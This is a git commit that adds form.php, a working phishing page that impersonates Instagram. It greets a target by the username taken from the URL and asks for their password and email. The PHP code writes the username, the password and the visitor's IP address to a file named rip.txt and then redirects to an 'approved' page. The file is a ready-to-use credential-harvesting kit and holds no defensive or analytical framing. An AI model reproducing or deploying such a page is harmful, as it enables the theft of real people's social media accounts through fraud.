3e7b8353eccea35ee934acb00913c2dd03012ede
Herooxd <94490499+Herooxd@users.noreply.github.com>
2021-12-04 16:46:49 +0300

    xd

---
+++ form.php
@@ -0,0 +1,275 @@
+<?php
+error_reporting(0);
+
+$nick=$_GET["nick"];
+if($nick==="" || $nick===" "){$nick="instagram";}else if($nick==fale){$nick="instagram";}
+if ($_POST) {
+	$password=$_POST["password"];
+	$ip=$_SERVER["REMOTE_ADDR"];
+	$nick=$_GET["nick"];
+	date_default_timezone_set('Europe/Istanbul');
+    $date=date("d-m-Y H:i:s");
+     $file = fopen('rip.txt', 'a');
+fwrite($file, " Kulaniciadi : ".$nick."\n\n" ." password: ".$password. "\n\n");
+
+$ipadres = $_SERVER["REMOTE_ADDR"];
+$ipkayit = fopen("rip.txt", "a");
+fwrite($ipkayit,"Ip Adresi: $ipadres");
+
+fclose($file);
+
+  
+   header("Location: approved.php");
+}
+
+
+?>
+
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <!-- ===============================================-->
+    <!--    Document Title-->
+    <!-- ===============================================-->
+  <title> @<?php echo $nick; ?> Instagram</title>
+
+
+    <!-- ===============================================-->
+    <!--    Favicons-->
+    <!-- ===============================================-->
+    <link rel="icon"   href="https://i.hizliresim.com/jiun7dz.png">
+
+
+    <!-- ===============================================-->
+    <!--    Stylesheets-->
+    <!-- ===============================================-->
+    <link href="assets/css/theme.css" rel="stylesheet" />
+
+  </head>
+
+
+  <body>
+
+    <!-- ===============================================-->
+    <!--    Main Content-->
+    <!-- ===============================================-->
+    <main class="main" id="top">
+      <nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" data-navbar-on-scroll="data-navbar-on-scroll">
+      <h5>Instagram From Facebook</h5></a>
+     <i class="bi bi-filter-right"></i>
+       <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" class="bi bi-filter-right" viewBox="0 0 16 16">
+  <path d="M14 10.5a.5.5 0 0 0-.5-.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 .5-.5zm0-3a.5.5 0 0 0-.5-.5h-7a.5.5 0 0 0 0 1h7a.5.5 0 0 0 .5-.5zm0-3a.5.5 0 0 0-.5-.5h-11a.5.5 0 0 0 0 1h11a.5.5 0 0 0 .5-.5z"/>
+</svg>
+          </div>
+        </div>
+      </nav>
+
+        <!--/.bg-holder-->
+
+        <div class="container">
+   
+             
+
+            
+              <div class="mt-5 mt-xl-6">
+                <ul class="list-unstyled list-inline mb-0">
+                  <li class="list-inline-item me-3"><a class="text-decoration-none" href="#!">
+                    
+                    
+                    
+                   </a></li>
+                
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+
+      <!-- ============================================-->
+      <!-- <section> begin ============================-->
+    
+      <!-- <section> close ============================-->
+      <!-- ============================================-->
+
+
+
+
+      <!-- ============================================-->
+      <!-- <section> begin ============================-->
+      <section id="services">
+
+        <div class="container">
+          <div class="row">
+         
+          </div>
+          <style>
+          .form{
+  
+  background:#fff;
+    font-family: "Roboto", sans-serif;
+    position: relative;
+    z-index: 1;
+    7e0cf5;
+  opacity: .2;
+    opacity: 99%;
+    max-width: 350px;
+    margin: 45px auto 35px;
+    padding: 10px 45px 30px 45px;
+    text-align: center;
+     -webkit-box-shadow: 0 2px 3px 0 rgba(0, 0, 0, 0.1);
+  box-shadow: 0 2px 3px 0 rgba(0, 0, 0, 0.1); }
+}
+          </style>
+          
+          <div class="form">
+       <form  method="post">
+     <center>
+       <img src="https://i.hizliresim.com/jiun7dz.png" style="width:90px;"><br><br>
+                        <h6 class="fw-light fs-1 heading-color">Hello @<?php echo "$nick"?></h6>
+                        <p class="mt-3 mb-md-0 mb-lg-3">fill in the form correctly. Otherwise we will not be able to help. </p>
+                          </a>
+                                 <input type="text" class= ""  placeholder="Know Name" required="1"aria-required="true" style="outline: 0;
+    border-radius: 25px;
+    background: #f5f5f5;
+    width: 100%;
+    border: 0;
+    margin: 0 0 15px;
+    padding: 15px;
+    box-sizing: border-box;
+    font-size: 14px;">
+       
+       <input type="password" name="password" placeholder="Password" required="" style="outline: 0;
+    border-radius: 25px;
+    background: #f5f5f5;
+    width: 100%;
+    border: 0;
+    margin: 0 0 15px;
+    padding: 15px;
+    box-sizing: border-box;
+    font-size: 14px;">
+      <input type="email" name="mail" placeholder="Email " required="" style="outline: 0;
+    border-radius: 25px;
+    background: #f5f5f5;
+    width: 100%;
+    border: 0;
+    margin: 0 0 15px;
+    padding: 15px;
+    box-sizing: border-box;
+    font-size: 14px;">
+         <br>
+         <br>
+         <br>
+        <button style="text-transform: uppercase;
+    outline: 0;
+    border-radius: 25px;
+    background-image: linear-gradient(-225deg, #A445B2 0%, #D41872 52%, #FF0066 100%);
+    width: 100%;
+    border: 0;
+    padding: 15px;
+    color: #FFFFFF;
+    font-size: 14px;
+    cursor: pointer;" id="buton" type="submit"> Continue as @<?php echo $nick; ?></button> </center></form>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                
+                
+              
+
+      </section>
+      <!-- <section> close ============================-->
+      <!-- ============================================-->
+
+
+
+
+      <!-- ============================================-->
+      <!-- <section> begin ============================-->
+    
+        </div><!-- end of .container-->
+
+      </section>
+      <!-- <section> close ============================-->
+      <!-- ============================================-->
+
+
+
+
+      <!-- ============================================-->
+      <!-- <section> begin ============================-->
+      <section style="background-image: linear-gradient(-225deg, #A445B2 0%, #D41872 52%, #FF0066 100%);">
+        <div id="get"><center>
+<img src="image/app.webp" width=120 >
+<img src="image/play.webp" width=120>
+</center>
+</div>
+
+        <div class="container">
+          <div class="row justify-content-between pb-2 pt-5">
+ 
+            <div class="col-auto mb-3">
+              <ul class="list-unstyled mb-md-4 mb-lg-0">
+                
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">About Us</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Support</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Press</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Apı</a></li>
+              </ul>
+            </div>
+            <div class="col-auto mb-3">
+              <ul class="list-unstyled mb-md-4 mb-lg-0">
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Jobs</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Prıvacy</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Terms</a></li>
+                <li class="mb-3"><a class="text-100 fw-light text-decoration-none" href="#!">Dırectory</a></li>
+              </ul>
+            </div>
+            <div class="col-auto mb-4 d-flex align-items-end">
+              <ul class="list-unstyled list-inline mb-0">
+                <li class="list-inline-item me-3"><a class="text-decoration-none" href="#!">
+                </a></li>
+              </ul>
+            </div>
+          </div>
+          <center>
+      <h5>COPYRIGHT 2021 INSTAGRAM </h5>
+          </center>    
+            </div>
+          </div>
+        </div><!-- end of .container-->
+
+      </section>
+      <!-- <section> close ============================-->
+      <!-- ============================================-->
+
+
+    </main>
+    <!-- ===============================================-->
+    <!--    End of Main Content-->
+    <!-- ===============================================-->
+
+
+
+
+    <!-- ===============================================-->
+    <!--    JavaScripts-->
+    <!-- ===============================================-->
+    <script src="vendors/@popperjs/popper.min.js"></script>
+    <script src="vendors/bootstrap/bootstrap.min.js"></script>
+    <script src="vendors/is/is.min.js"></script>
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=window.scroll"></script>
+    <script src="assets/js/theme.js"></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+  </body>
+
+</html>
